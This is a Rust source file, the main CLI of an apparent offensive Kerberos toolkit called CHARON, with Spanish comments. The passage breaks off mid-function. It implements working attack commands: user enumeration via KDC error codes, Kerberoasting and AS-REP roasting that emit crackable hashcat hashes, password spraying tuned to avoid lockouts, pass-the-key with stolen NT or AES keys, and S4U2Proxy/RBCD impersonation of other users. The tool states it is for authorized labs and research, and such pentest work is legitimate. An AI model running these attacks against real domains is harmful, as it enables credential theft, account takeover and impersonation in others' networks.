//! CHARON — el barquero que transporta mensajes entre cliente y KDC
//! y te muestra todo lo que cruza el río.

use std::io::{BufRead as _, Write as _};
use std::process::ExitCode;

use clap::{Parser, Subcommand, ValueEnum};
use owo_colors::OwoColorize;
use charon_client::KdcConnection;
use charon_kcrypto::{etype as etype_mod, KerberosKey};
use zeroize::Zeroizing;

/// Workbench del protocolo Kerberos: stack propio desde el wire format,
/// primitivos ofensivos con control total de cada campo y decodificación
/// campo a campo con referencia al RFC.
#[derive(Parser, Debug)]
#[command(
    name = "charon",
    version,
    about = "Workbench de protocolo Kerberos: arma y microscopio",
    long_about = "CHARON implementa el protocolo Kerberos desde el wire format —codec ASN.1/DER propio, crypto RFC-conformante—, ejecuta los primitivos ofensivos estándar con control total sobre cada campo, y decodifica cada mensaje explicándolo con referencia al RFC.\n\nDiseñado para laboratorios propios (pentesting autorizado, análisis defensivo, investigación).",
    after_help = "Ejemplos:\n  charon enum --users jdoe,svcsql,ghost -r LAB.LOCAL\n  charon kerberoast --spn MSSQLSvc/srv01.lab.local --user jdoe --password '***' -r LAB.LOCAL\n  charon as --user jdoe -r LAB.LOCAL --renewable --ccache jdoe.ccache\n  charon ccache --file jdoe.ccache\n  charon decode --file as-rep.bin --password '***' --user jdoe -r LAB.LOCAL\n\nUso ético: solo contra dominios y KDCs de tu propiedad o con autorización explícita."
)]
struct Cli {
    #[command(subcommand)]
    command: Command,
}

#[derive(ValueEnum, Clone, Copy, Debug)]
enum ETypeArg {
    Aes128,
    Aes256,
    Rc4,
}

impl ETypeArg {
    fn id(self) -> i32 {
        match self {
            ETypeArg::Aes128 => etype_mod::AES128_CTS_HMAC_SHA1_96,
            ETypeArg::Aes256 => etype_mod::AES256_CTS_HMAC_SHA1_96,
            ETypeArg::Rc4 => etype_mod::RC4_HMAC,
        }
    }
}

#[derive(Subcommand, Debug)]
enum Command {
    /// Enumera usuarios explotando los códigos de error del KDC (6/25/24).
    Enum {
        /// Usuarios a comprobar, separados por coma o ruta a fichero (@fichero).
        #[arg(short, long, value_delimiter = ',')]
        users: Vec<String>,
        #[arg(short, long)]
        realm: String,
        #[arg(long, default_value = "127.0.0.1")]
        dc: String,
        #[arg(long, default_value_t = 88)]
        port: u16,
        /// Preferencia de etypes en la petición (sin preauth es informativo).
        #[arg(long, value_enum, default_value = "aes256")]
        etype: ETypeArg,
        #[arg(long)]
        json: bool,
    },
    /// Kerberoasting AES-first: pide tickets de servicio para crackear offline.
    Kerberoast {
        /// SPNs objetivo, separados por coma.
        #[arg(short, long, value_delimiter = ',')]
        spn: Vec<String>,
        #[arg(short, long)]
        user: String,
        /// Contraseña del usuario (o --password-stdin; env: CHARON_PASSWORD).
        #[arg(short, long, env = "CHARON_PASSWORD", hide_env_values = true)]
        password: Option<String>,
        /// Lee la contraseña por stdin: no aparece en `ps` ni en el history.
        #[arg(long)]
        password_stdin: bool,
        #[arg(short, long)]
        realm: String,
        /// Salt AES del usuario (si no lo conoces, Charon lo aprende del error 25).
        #[arg(long)]
        salt: Option<String>,
        /// Orden de etypes pedidos al KDC (AES-first por defecto: OPSEC).
        #[arg(long, value_enum, num_args = 1.., default_values = &["aes256", "aes128"])]
        etype: Vec<ETypeArg>,
        #[arg(long, default_value = "127.0.0.1")]
        dc: String,
        #[arg(long, default_value_t = 88)]
        port: u16,
        #[arg(long)]
        json: bool,
        /// Escribe los hashes hashcat a este fichero además de imprimirlos.
        #[arg(long)]
        output: Option<String>,
    },
    /// Password spraying: una contraseña candidata contra muchos usuarios
    /// con el flujo AS completo (clasifica 6/24/éxito y aprende el salt
    /// de cada usuario del error 25 antes de probar).
    Spray {
        /// Usuarios a probar, separados por coma o ruta a fichero (@fichero).
        #[arg(short, long, value_delimiter = ',')]
        users: Vec<String>,
        /// Fichero (ruta o @ruta) con pares usuario:contraseña, uno por
        /// línea ('#' comenta; la contraseña puede contener ':'). Si se
        /// da, cada usuario se prueba con SU contraseña y se ignoran
        /// --users y --password. Página de seguridad: el fichero queda
        /// con contraseñas en claro — 900 permisos recomendados.
        #[arg(long)]
        pairs: Option<String>,
        /// Contraseña candidata (o --password-stdin; env: CHARON_PASSWORD).
        #[arg(short, long, env = "CHARON_PASSWORD", hide_env_values = true)]
        password: Option<String>,
        /// Lee la contraseña por stdin: no aparece en `ps` ni en el history.
        #[arg(long)]
        password_stdin: bool,
        #[arg(short, long)]
        realm: String,
        #[arg(long, default_value = "127.0.0.1")]
        dc: String,
        #[arg(long, default_value_t = 88)]
        port: u16,
        /// Pausa entre intentos en ms (OPSEC: menos ruido y menos lockouts).
        #[arg(long, default_value_t = 0)]
        delay_ms: u64,
        #[arg(long)]
        json: bool,
        /// Fichero donde dejar los aciertos (usuario<TAB>contraseña).
        #[arg(long)]
        output: Option<String>,
    },
    /// AS-REP roasting: cuentas con DONT_REQUIRE_PREAUTH.
    Asreproast {
        #[arg(short, long, value_delimiter = ',')]
        users: Vec<String>,
        #[arg(short, long)]
        realm: String,
        #[arg(long, default_value = "127.0.0.1")]
        dc: String,
        #[arg(long, default_value_t = 88)]
        port: u16,
        #[arg(long)]
        json: bool,
        /// Escribe los hashes hashcat a este fichero además de imprimirlos.
        #[arg(long)]
        output: Option<String>,
    },
    /// Pass-the-key: autentica con NT hash o clave AES sin la contraseña.
    Passthekey {
        #[arg(short, long)]
        user: String,
        #[arg(short, long)]
        realm: String,
        /// NT hash (32 hex) — implica etype 23.
        #[arg(long, group = "key")]
        nt_hash: Option<String>,
        /// Clave AES128/AES256 en hex — el etype se deduce de la longitud.
        #[arg(long, group = "key")]
        aes_key: Option<String>,
        #[arg(long, default_value = "127.0.0.1")]
        dc: String,
        #[arg(long, default_value_t = 88)]
        port: u16,
        /// Tras autenticar, muestra el trace completo del intercambio.
        #[arg(long)]
        trace: bool,
        /// Salida en JSON (un objeto: user, key_etype, session_etype, endtime).
        #[arg(long)]
        json: bool,
    },
    /// Obtiene un TGT y muestra qué viajó por el cable.
    As {
        #[arg(short, long)]
        user: String,
        /// Contraseña (o --password-stdin; env: CHARON_PASSWORD).
        #[arg(short, long, env = "CHARON_PASSWORD", hide_env_values = true)]
        password: Option<String>,
        /// Lee la contraseña por stdin: no aparece en `ps` ni en el history.
        #[arg(long)]
        password_stdin: bool,
        #[arg(short, long)]
        realm: String,
        /// Salt AES (por defecto: realm + cname, la construcción estándar).
        #[arg(long)]
        salt: Option<String>,
        #[arg(long, value_enum, default_value = "aes256")]
        etype: ETypeArg,
        /// Pide un TGT RENOVABLE (flag RENEWABLE + rtime de 7 días, que
        /// el KDC recorta a su max_renewable_life): lo que `kinit -r`.
        #[arg(long)]
        renewable: bool,
        /// Guarda el TGT en un ccache FILE v4 de MIT (0600): luego
        /// `charon renew --ccache` renueva SIN volver a credencializar.
        /// klist/kinit de MIT leen el fichero (interoperabilidad real).
        #[arg(long)]
        ccache: Option<String>,
        /// Autentica con la clave del principal en este keytab (formato
        /// FILE v1/v2 de MIT, el que escriben ktadd/ktutil): sin
        /// contraseña. --user elige la entrada; el reino debe coincidir.
        #[arg(long)]
        keytab: Option<String>,
        #[arg(long, default_value = "127.0.0.1")]
        dc: String,
        #[arg(long, default_value_t = 88)]
        port: u16,
        /// Salida en JSON (un objeto: crealm, cname, sname, flags, tiempos).
        #[arg(long)]
        json: bool,
    },
    /// Renovación de TGT (RFC 4120 §3.3.3). Dos caminos: con credenciales
    /// (--user/--realm) obtiene un TGT renovable y lo renueva; con
    /// --ccache renueva el TGT persistido SIN recredencializar (y lo
    /// reescribe renovado en el mismo fichero).
    Renew {
        #[arg(short, long)]
        user: Option<String>,
        /// Contraseña (o --password-stdin; env: CHARON_PASSWORD).
        #[arg(short, long, env = "CHARON_PASSWORD", hide_env_values = true)]
        password: Option<String>,
        /// Lee la contraseña por stdin: no aparece en `ps` ni en el history.
        #[arg(long)]
        password_stdin: bool,
        #[arg(short, long)]
        realm: Option<String>,
        /// Salt AES (por defecto lo aprende del error 25).
        #[arg(long)]
        salt: Option<String>,
        /// Ventana de renovación pedida, en horas (el KDC recorta a su
        /// max_renewable_life; el lab: 7 días = 168 h).
        #[arg(long, default_value_t = 168)]
        renew_hours: u64,
        /// Renueva el TGT guardado en este ccache FILE v4 (de
        /// `charon as --ccache`): sin usuario ni contraseña, como
        /// `kinit -R -c`. El fichero se reescribe con el TGT renovado.
        #[arg(long)]
        ccache: Option<String>,
        #[arg(long, default_value = "127.0.0.1")]
        dc: String,
        #[arg(long, default_value_t = 88)]
        port: u16,
        /// Muestra el trace del TGS-REP de la renovación.
        #[arg(long)]
        trace: bool,
        /// Salida en JSON (un objeto: modo, cname, sname, tiempos).
        #[arg(long)]
        json: bool,
    },
    /// Decodifica cualquier mensaje Kerberos capturado y lo explica campo a campo.
    Decode {
        /// Fichero con el mensaje DER crudo (sin framing TCP).
        #[arg(short, long)]
        file: String,
        /// Clave para descifrar el enc-part (contraseña: salt = realm+user).
        #[arg(short, long, env = "CHARON_PASSWORD", hide_env_values = true)]
        password: Option<String>,
        /// Lee la contraseña por stdin: no aparece en `ps` ni en el history.
        #[arg(long)]
        password_stdin: bool,
        /// Alternativa: NT hash para etype 23.
        #[arg(long)]
        nt_hash: Option<String>,
        #[arg(short, long)]
        realm: String,
        #[arg(short, long)]
        user: String,
        /// Cifra el enc-part de un AS-REP (usage 3) o TGS-REP (usage 8) según el mensaje.
        #[arg(long, default_value_t = 8)]
        usage: u32,
        #[arg(long)]
        json: bool,
    },
    /// S4U2Self (MS-SFU): ticket para un usuario "en nombre de" otro,
    /// presentando el TGT del servicio. Útil para ver el PAC delegado.
    /// La clave del servicio sale de --keytab (ktadd/ktutil) o de la
    /// contraseña con su salt: fuentes exclusivas, como en `as`.
    S4u2self {
        /// El servicio que pide (dueño del TGT).
        #[arg(short, long)]
        user: String,
        /// Contraseña del servicio (o --password-stdin; env:
        /// CHARON_PASSWORD). Obligatoria solo si no hay --keytab.
        #[arg(short, long, env = "CHARON_PASSWORD", hide_env_values = true)]
        password: Option<String>,
        /// Lee la contraseña por stdin: no aparece en `ps` ni en el history.
        #[arg(long)]
        password_stdin: bool,
        /// Autentica el servicio con la clave de este keytab (formato
        /// FILE v1/v2 de MIT): sin contraseña. --user elige la entrada;
        /// el reino de la entrada debe coincidir.
        #[arg(long)]
        keytab: Option<String>,
        /// Salt AES del servicio (solo en el camino de contraseña).
        #[arg(long)]
        salt: Option<String>,
        /// Usuario a suplantar.
        #[arg(short, long)]
        impersonate: String,
        #[arg(short, long)]
        realm: String,
        #[arg(long, default_value = "127.0.0.1")]
        dc: String,
        #[arg(long, default_value_t = 88)]
        port: u16,
        /// Salida en JSON (un objeto: service, impersonated, etype,
        /// forwardable, pac_client o pac_error).
        #[arg(long)]
        json: bool,
    },
    /// S4U2Proxy (MS-SFU §2.2.3, primitivo de RBCD): con el TGT del
    /// servicio y el evidence ticket de S4U2Self, pide un ticket del
    /// usuario suplantado hacia OTRO servicio. Si --to-password está
    /// presente, descifra el ticket final con la clave del servicio
    /// destino y muestra el PAC del usuario suplantado (la prueba de la
    /// delegación). El servicio que delega necesita el atributo
    /// ok_to_auth_as_delegate en el KDC (ver scripts/lab_setup_delegation.sh).
    S4u2proxy {
        /// El servicio que delega (dueño del TGT y del evidence ticket).
        #[arg(short, long)]
        user: String,
        /// Contraseña del servicio que delega (o --password-stdin; env:
        /// CHARON_PASSWORD). Obligatoria solo si no hay --keytab.
        #[arg(short, long, env = "CHARON_PASSWORD", hide_env_values = true)]
        password: Option<String>,
        /// Lee la contraseña por stdin: no aparece en `ps` ni en el history.
        #[arg(long)]
        password_stdin: bool,
        /// Clave del servicio que DELEGA desde este keytab (FILE v1/v2
        /// de MIT): sin contraseña. --user elige la entrada.
        #[arg(long)]
        keytab: Option<String>,
        /// Salt AES del servicio que delega (solo camino de contraseña).
        #[arg(long)]
        salt: Option<String>,
        /// Usuario a suplantar.
        #[arg(short, long)]
        impersonate: String,
        /// SPN del servicio destino del ticket delegado.
        #[arg(long)]
        to: String,
        /// Contraseña del servicio destino: permite descifrar el ticket
        /// final y demostrar el PAC del usuario suplantado.
        #[arg(long)]
        to_password: Option<String>,
        /// Keytab del servicio destino (FILE v1/v2 de MIT): alternativa
        /// a --to-password para descifrar el ticket final — la única vía
        /// con KDBs sin contraseñas (LDAP/test) o cuentas de máquina.
        /// Exclusivo con --to-password.
        #[arg(long)]
        to_keytab: Option<String>,
        /// Delegación resource-based (MS-KILE §2.2.10): añade PA-PAC-
        /// OPTIONS con el bit RBCD y el KDC consulta la política en el
        /// RECURSO (--to), no en el impersonador — el esquema de AD
        /// moderno (msDS-AllowedToActOnBehalfOfOtherIdentity). Sin este
        /// flag la autorización es la tradicional (tabla delegation /
        /// msDS-AllowedToDelegateTo).
        #[arg(long)]
        rbcd: bool,
        #[arg(short, long)]
        realm: String,
        #[arg(long, default_value = "127.0.0.1")]
        dc: String,
        #[arg(long, default_value_t = 88)]
        port: u16,
        /// Salida en JSON (un objeto: service, impersonated, target,
        /// ticket_etype, pac_client o pac_error).
        #[arg(long)]
        json: bool,
    },
    /// Ejecuta la matriz de comportamiento KDC y escribe el dataset JSON.
    Matrix {
        #[arg(short, long)]
        realm: String,
        /// Usuario válido con contraseña conocida.
        #[arg(short, long)]
        user: String,
        #[arg(short, long, env = "CHARON_PASSWORD", hide_env_values = true)]
        password: String,
        /// Cuenta AES-only del laboratorio.
        #[arg(long, default_value = "aesuser")]
        aes_only_user: String,
        /// Cuenta DONT_REQUIRE_PREAUTH del laboratorio.
        #[arg(long, default_value = "nopreauth")]
        no_preauth_user: String,
        /// SPN de servicio con AES.
        #[arg(long, default_value = "mssql/srv01.lab.local")]
        spn_with_aes: String,
        /// SPN de servicio RC4-only.
        #[arg(long, default_value = "legacy")]
        spn_rc4_only: String,
        /// Usuario que NO debe existir (sonda de enumeración).
        #[arg(long, default_value = "ghost-inexistente-charon")]
        ghost_user: String,
        /// Etiqueta del perfil en el dataset (ej: mit-krb5-1.21, windows-dc, samba).
        #[arg(long, default_value = "custom")]
        profile: String,
        #[arg(long, default_value = "127.0.0.1")]
        dc: String,
        #[arg(long, default_value_t = 88)]
        port: u16,
        /// Fichero de salida (por defecto: stdout).
        #[arg(short, long)]
        out: Option<String>,
    },
    /// Lista las entradas de un keytab de MIT (principal, kvno, enctype y
    /// timestamp). NUNCA imprime las claves: el keytab es material
    /// sensible y el listado es para inspección, no para volcado.
    Keytab {
        /// Ruta del fichero keytab (formato FILE v1/v2 de MIT).
        #[arg(short, long)]
        file: String,
        #[arg(long)]
        json: bool,
    },
    /// Inspecciona un ccache FILE v4 de MIT (el que escriben `charon as
    /// --ccache` y `kinit`): principal por defecto y cada credencial con
    /// su enctype, kvno del ticket, flags con nombre, tiempos y si sigue
    /// vigente — sin herramientas externas (equivalente a `klist -c`).
    /// NUNCA imprime la clave de sesión: el ccache lleva material
    /// sensible y la inspección es para auditar, no para volcar.
    Ccache {
        /// Ruta del fichero ccache (formato FILE v4 de MIT).
        #[arg(short, long)]
        file: String,
        #[arg(long)]
        json: bool,
    },
}

fn conn(dc: &str, port: u16) -> KdcConnection {
    KdcConnection::new(dc, port)
}

fn main() -> ExitCode {
    let cli = Cli::parse();
    match run(cli) {
        Ok(()) => ExitCode::SUCCESS,
        Err(msg) => {
            eprintln!("{} {}", "error:".red().bold(), msg);
            ExitCode::FAILURE
        }
    }
}

fn fail(msg: String) -> Result<(), String> {
    Err(msg)
}

fn run(cli: Cli) -> Result<(), String> {
    match cli.command {
        Command::Enum { users, realm, dc, port, etype, json } => {
            let list = resolve_users(&users)?;
            if list.is_empty() {
                return fail("--users vacío: pasa usuarios separados por coma o @fichero".into());
            }
            let c = conn(&dc, port);
            let etypes = [etype.id()];
            let mut results = Vec::new();
            for u in &list {
                let status = charon_attacks::enum_user(&c, u, &realm, &etypes).map_err(|e| e.to_string())?;
                if !json {
                    print_enum(u, &status);
                }
                results.push((u.clone(), status));
            }
            if json {
                let json_items: Vec<serde_json::Value> =
                    results.iter().map(|(u, st)| user_status_json(u, st)).collect();
                println!("{}", serde_json::to_string_pretty(&json_items).map_err(|e| e.to_string())?);
            } else {
                let exists = results.iter().filter(|(_, s)| s.exists()).count();
                println!(
                    "\n{} {} de {} usuarios existen según {}",
                    "resumen:".bold(),
                    exists.to_string().cyan(),
                    results.len(),
                    dc.bold()
                );
            }
            Ok(())
        }

        Command::Kerberoast { spn, user, password, password_stdin, realm, salt, etype, dc, port, json, output } => {
            if spn.is_empty() {
                return fail("--spn vacío".into());
            }
            let password = resolve_password(password.map(Zeroizing::new), password_stdin)?;
            let c = conn(&dc, port);
            // 1) aprender el salt si no viene: AS-REQ sin preauth del usuario.
            let salt = match salt {
                Some(s) => s,
                None => learn_salt(&c, &user, &realm)?,
            };
            // 2) TGT con AES (clave del usuario derivada del salt).
            let key = key_from_credentials(&user, &realm, &salt, &password, None, None)?;
            let tgt = charon_client::request_tgt(&c, &user, &realm, &key, &[etype_mod::AES256_CTS_HMAC_SHA1_96], charon_krb5::kdc_options::FORWARDABLE)
                .map_err(|e| format!("no se pudo obtener el TGT (¿contraseña/salt correctos?): {e}"))?;
            // 3) AES-first: pedir 18/17 primero (OPSEC: sin downgrade).
            let etypes: Vec<i32> = {
                let mut v: Vec<i32> = etype.iter().map(|e| e.id()).collect();
                v.push(etype_mod::RC4_HMAC); // último recurso
                v.dedup();
                v
            };
            let mut out = Vec::new();
            let mut hashes = Vec::new();
            for s in &spn {
                let r = charon_attacks::kerberoast(&c, &tgt, s, &etypes, charon_krb5::kdc_options::CANONICALIZE)
                    .map_err(|e| e.to_string())?;
                hashes.push(r.hashcat.clone());
                if json {
                    out.push(serde_json::json!({
                        "spn": r.spn, "account": r.account, "realm": r.realm,
                        "etype": r.etype, "hashcat": r.hashcat
                    }));
                } else {
                    println!(
                        "\n{} {} → ticket en {}",
                        "kerberoast:".bold(),
                        s.cyan(),
                        etype_name(r.etype).yellow()
                    );
                    println!("{}", r.hashcat.green());
                }
            }
            if json {
                println!("{}", serde_json::to_string_pretty(&out).map_err(|e| e.to_string())?);
            }
            if let Some(path) = &output {
                write_output(path, &hashes)?;
            }
            Ok(())
        }

        Command::Asreproast { users, realm, dc, port, json, output } => {
            let list = resolve_users(&users)?;
            let c = conn(&dc, port);
            let etypes = [etype_mod::AES256_CTS_HMAC_SHA1_96, etype_mod::AES128_CTS_HMAC_SHA1_96, etype_mod::RC4_HMAC];
            let mut any = false;
            let mut hashes = Vec::new();
            for u in &list {
                let r = charon_attacks::asreproast(&c, u, &realm, &etypes).map_err(|e| e.to_string())?;
                match r {
                    Some(rep) => {
                        any = true;
                        hashes.push(rep.hashcat.clone());
                        if !json {
                            println!(
                                "\n{} {} → cuenta sin preauth, ticket en {}",
                                "asreproast:".bold(),
                                u.cyan(),
                                etype_name(rep.etype).yellow()
                            );
                            println!("{}", rep.hashcat.green());
                        } else {
                            println!("{}", serde_json::json!({"account": rep.account, "etype": rep.etype, "hashcat": rep.hashcat}));
                        }
                    }
                    None => {
                        if !json {
                            println!("{} {}: la cuenta requiere preauth o no existe", "·".dimmed(), u);
                        }
                    }
                }
            }
            if json && !any {
                println!("[]");
            }
            let _ = any;
            if let Some(path) = &output {
                write_output(path, &hashes)?;
            }
            Ok(())
        }

        Command::Spray { users, pairs, password, password_stdin, realm, dc, port, delay_ms, json, output } => {
            // En modo pares cada usuario lleva SU contraseña; el modo
            // clásico (una contraseña contra la lista) queda intacto.
            // El contenedor SprayPairs hace zeroize de las contraseñas al
            // soltarlas (patrón de KerberosKey en kcrypto, pendiente desde
            // la Ronda 2): los secretos del fichero de pares no quedan en
            // memoria muerta después del comando.
            let targets = SprayPairs(if let Some(path) = &pairs {
                if !users.is_empty() || password.is_some() || password_stdin {
                    return fail(
                        "--pairs no es compatible con --users/--password/--password-stdin: en modo pares cada usuario lleva su propia contraseña".into(),
                    );
                }
                resolve_pairs(path)?
            } else {
                let list = resolve_users(&users)?;
                if list.is_empty() {
                    return fail("--users vacío: pasa usuarios separados por coma o @fichero".into());
                }
                let password = resolve_password(password.map(Zeroizing::new), password_stdin)?;
                list.into_iter().map(|u| (u, (*password).clone())).collect()
            });
            if targets.is_empty() {
                return fail("no hay objetivos de spray".into());
            }
            let c = conn(&dc, port);
            let etypes = [etype_mod::AES256_CTS_HMAC_SHA1_96, etype_mod::AES128_CTS_HMAC_SHA1_96];
            let mut hits = Hits::default();
            let mut rows = Vec::new();
            for (i, (u, pw)) in targets.iter().enumerate() {
                if i > 0 && delay_ms > 0 {
                    std::thread::sleep(std::time::Duration::from_millis(delay_ms));
                }
                match charon_attacks::spray_password(&c, u, &realm, pw, &etypes) {
                    Ok(att) => {
                        if att.result.valid() {
                            hits.push(format!("{u}\t{pw}"));
                        }
                        if !json {
                            print_spray(&att);
                        }
                        rows.push(spray_result_json(&att.user, &att.result));
                    }
                    Err(e) => {
                        if !json {
                            println!("{} {}: fallo de protocolo: {e}", "✗".red().bold(), u.cyan());
                        }
                        // Fallo de transporte/protocolo: sin clasificación
                        // del KDC, el estado lo dice explícito.
                        rows.push(serde_json::json!({
                            "user": u,
                            "state": "protocol_error",
                            "error": e.to_string(),
                        }));
                    }
                }
            }
            if json {
                println!("{}", serde_json::to_string_pretty(&rows).map_err(|e| e.to_string())?);
            } else {
                println!(
                    "\n{} {} credenciales válidas de {} usuarios probados contra {}",
                    "resumen:".bold(),
                    hits.len().to_string().cyan(),
                    targets.len(),
                    dc.bold()
                );
            }
            if let Some(path) = &output {
                write_output(path, &hits)?;
            }
            Ok(())
        }

        Command::Passthekey { user, realm, nt_hash, aes_key, dc, port, trace, json } => {
            let c = conn(&dc, port);
            let (key, salt_used) = if let Some(h) = &nt_hash {
                let bytes = decode_hex(h)?;
                (KerberosKey::from_raw(etype_mod::RC4_HMAC, &bytes).map_err(|e| e.to_string())?, "NT hash (etype 23)".to_string())
            } else if let Some(h) = &aes_key {
                let bytes = decode_hex(h)?;
                let et = match bytes.len() {
                    16 => etype_mod::AES128_CTS_HMAC_SHA1_96,
                    32 => etype_mod::AES256_CTS_HMAC_SHA1_96,
                    n => return Err(format!("clave AES de {n} bytes: deben ser 16 o 32")),
                };
                // La clave AES necesita salt para… nada: ya ES la clave.
                (KerberosKey::from_raw(et, &bytes).map_err(|e| e.to_string())?, format!("clave AES ({})", etype_name(et)))
            } else {
                return Err("indica --nt-hash o --aes-key".into());
            };
            let _ = salt_used;
            // Con clave RC4 pedimos también 18: MIT 1.21 exige un etype de
            // sesión no deprecado aunque el preauth verifique con RC4.
            let etypes: Vec<i32> = if key.etype() == etype_mod::RC4_HMAC {
                vec![etype_mod::RC4_HMAC, etype_mod::AES256_CTS_HMAC_SHA1_96]
            } else {
                vec![key.etype()]
            };
            let tgt = charon_client::request_tgt(&c, &user, &realm, &key, &etypes, 0)
                .map_err(|e| format!("pass-the-key rechazado por el KDC: {e}"))?;
            if json {
                println!(
                    "{}",
                    serde_json::json!({
                        "command": "passthekey",
                        "user": user,
                        "realm": realm,
                        "key_etype": key.etype(),
                        "key_etype_name": etype_name(key.etype()),
                        "session_etype": tgt.session_key.keytype,
                        "endtime": tgt.endtime.to_string(),
                    })
                );
                return Ok(());
            }
            println!(
                "{} TGT obtenido para {} usando la clave directamente ({}).",
                "pass-the-key:".bold(),
                user.cyan(),
                etype_name(key.etype())
            );
            println!("  sesión: etype {}, caduca {}", tgt.session_key.keytype, tgt.endtime);
            if trace {
                let node = charon_trace::trace_kdc_rep(&tgt.raw_reply, Some(&key)).map_err(|e| e.to_string())?;
                println!("\n{}", charon_trace::render_text(&node));
            }
            Ok(())
        }

        Command::As { user, password, password_stdin, realm, salt, etype, renewable, ccache, keytab, dc, port, json } => {
            let c = conn(&dc, port);
            // Fuente de clave exclusiva: keytab (claves exportadas por
            // ktadd/ktutil) o contraseña con su salt. Con keytab no hay
            // sal que aprender: la clave YA está en el fichero.
            let (key, req_etypes, key_source) = if let Some(kt_path) = &keytab {
                if password.is_some() || password_stdin || salt.is_some() {
                    return fail(
                        "--keytab es incompatible con --password/--password-stdin/--salt: \
                         la clave sale del fichero (el salt ya está cocido en ella)"
                            .into(),
                    );
                }
                let (kt_key, kt_kvno, kt_enctype) = key_from_keytab(kt_path, &user, &realm)?;
                // Con clave RC4 se pide también 18: MIT 1.21 exige un
                // etype de sesión no deprecado (lección de passthekey).
                let etypes = if kt_enctype == etype_mod::RC4_HMAC {
                    vec![etype_mod::RC4_HMAC, etype_mod::AES256_CTS_HMAC_SHA1_96]
                } else {
                    vec![kt_enctype]
                };
                (
                    kt_key,
                    etypes,
                    format!("keytab {kt_path} (kvno {kt_kvno}, {})", etype_name(kt_enctype)),
                )
            } else {
                let password = resolve_password(password.map(Zeroizing::new), password_stdin)?;
                let salt = match salt {
                    Some(s) => s,
                    None => learn_salt(&c, &user, &realm)?,
                };
                (
                    key_from_credentials(&user, &realm, &salt, &password, None, None)?,
                    vec![etype.id()],
                    "contraseña".to_string(),
                )
            };
            let tgt = if renewable {
                let till = charon_asn1::KrbTime::now().plus_secs(7 * 86_400);
                charon_client::request_tgt_renewable(&c, &user, &realm, &key, &req_etypes, till)
                    .map_err(|e| e.to_string())?
            } else {
                charon_client::request_tgt(&c, &user, &realm, &key, &req_etypes, 0)
                    .map_err(|e| e.to_string())?
            };
            let renew_note = if renewable {
                format!(", renovable hasta {}", tgt.renew_till.map(|t| t.to_string()).unwrap_or_default())
            } else {
                String::new()
            };
            if json {
                println!(
                    "{}",
                    serde_json::json!({
                        "command": "as",
                        "crealm": tgt.crealm,
                        "cname": tgt.cname,
                        "sname": tgt.ticket.sname.flat(),
                        "session_etype": tgt.session_key.keytype,
                        "flags": ticket_flag_names(tgt.flags),
                        "authtime": tgt.authtime.to_string(),
                        "endtime": tgt.endtime.to_string(),
                        "renew_till": tgt.renew_till.map(|t| t.to_string()),
                        "key_source": key_source,
                    })
                );
                return Ok(());
            }
            println!(
                "{} TGT {} → {}, sesión etype {}, caduca {}{}",
                "AS:".bold(),
                format!("{user}@{realm}").cyan(),
                tgt.ticket.sname.flat().yellow(),
                tgt.session_key.keytype,
                tgt.endtime,
                renew_note
            );
            println!("  {} clave del cliente desde {}", "·".dimmed(), key_source.dimmed());
            if let Some(path) = &ccache {
                charon_client::ccache::save_tgt(path, &tgt)
                    .map_err(|e| format!("no pude escribir el ccache {path}: {e}"))?;
                println!(
                    "{} TGT guardado en {} (0600): renovable sin contraseña con `charon renew --ccache {path}`",
                    "ccache:".bold(),
                    path.yellow()
                );
            }
            let node = charon_trace::trace_kdc_rep(&tgt.raw_reply, Some(&key)).map_err(|e| e.to_string())?;
            println!("\n{}", charon_trace::render_text(&node));
            Ok(())
        }

        Command::Renew { user, password, password_stdin, realm, salt, renew_hours, ccache, dc, port, trace, json } => {
            let c = conn(&dc, port);
            // Dos caminos exclusivos: ccache (sin credenciales) o AS completo.
            if let Some(path) = &ccache {
                if user.is_some() || salt.is_some() || realm.is_some() || password_stdin {
                    return fail(
                        "--ccache es incompatible con --user/--realm/--salt/--password-stdin: \
                         el TGT persistido ya trae su identidad"
                            .into(),
                    );
                }
                if password.is_some() {
                    return fail(
                        "--ccache es incompatible con --password: renovar SIN recredencializar \
                         es justo el punto (usa `charon as --ccache` para crear el fichero)"
                            .into(),
                    );
                }
                let tgt = charon_client::ccache::load_tgt(path)
                    .map_err(|e| format!("ccache {path}: {e}"))?;
                if tgt.flags & charon_krb5::ticket_flags::RENEWABLE == 0 {
                    return fail(format!(
                        "el TGT de {path} no lleva el flag RENEWABLE: crealo con `charon as --renewable --ccache`"
                    ));
                }
                println!(
                    "{} cargado {}@{} → caduca {}, renovable hasta {}",
                    "renew:".bold(),
                    format!("{}/{}", tgt.crealm, tgt.cname).cyan(),
                    tgt.ticket.sname.flat(),
                    tgt.endtime.to_string().yellow(),
                    tgt.renew_till.map(|t| t.to_string()).unwrap_or_default()
                );
                // Mismo acote que el camino con credenciales: saturar antes
                // del cast para que el till nunca salga negativo.
                let till = charon_asn1::KrbTime::now().plus_secs(
                    renew_hours.saturating_mul(3_600).min(i64::MAX as u64) as i64,
                );
                let renewed = charon_client::renew_tgt(&c, &tgt, till)
                    .map_err(|e| format!("renovación rechazada por el KDC: {e}"))?;
                // Reescribe el fichero con el TGT renovado (lo que hace
                // `kinit -R -c`): la próxima renovación parte del nuevo.
                // ANTES de la salida JSON: renovar sin persistir dejaría
                // el ccache con el TGT viejo y la promesa del JSON rota.
                charon_client::ccache::save_tgt(path, &renewed)
                    .map_err(|e| format!("no pude actualizar el ccache {path}: {e}"))?;
                if json {
                    println!(
                        "{}",
                        serde_json::json!({
                            "command": "renew",
                            "mode": "ccache",
                            "cname": format!("{}@{}", tgt.cname, tgt.crealm),
                            "sname": tgt.ticket.sname.flat(),
                            "session_etype": renewed.session_key.keytype,
                            "authtime": renewed.authtime.to_string(),
                            "endtime": renewed.endtime.to_string(),
                            "renew_till": renewed.renew_till.map(|t| t.to_string()),
                            "file_updated": true,
                        })
                    );
                    return Ok(());
                }
                println!(
                    "{} renovado → caduca {} (authtime conservada: {}, nueva clave de sesión etype {})",
                    "  ↳".green(),
                    renewed.endtime.to_string().yellow(),
                    renewed.authtime,
                    renewed.session_key.keytype
                );
                println!(
                    "{} fichero actualizado con el TGT renovado",
                    "ccache:".bold()
                );
                if trace {
                    let sess = KerberosKey::from_raw(tgt.session_key.keytype, &tgt.session_key.keyvalue)
                        .map_err(|e| e.to_string())?;
                    let node =
                        charon_trace::trace_kdc_rep(&renewed.raw_reply, Some(&sess)).map_err(|e| e.to_string())?;
                    println!("\n{}", charon_trace::render_text(&node));
                }
                return Ok(());
            }
            // Camino clásico: credenciales → TGT renovable → renovación.
            let user = user.ok_or_else(|| {
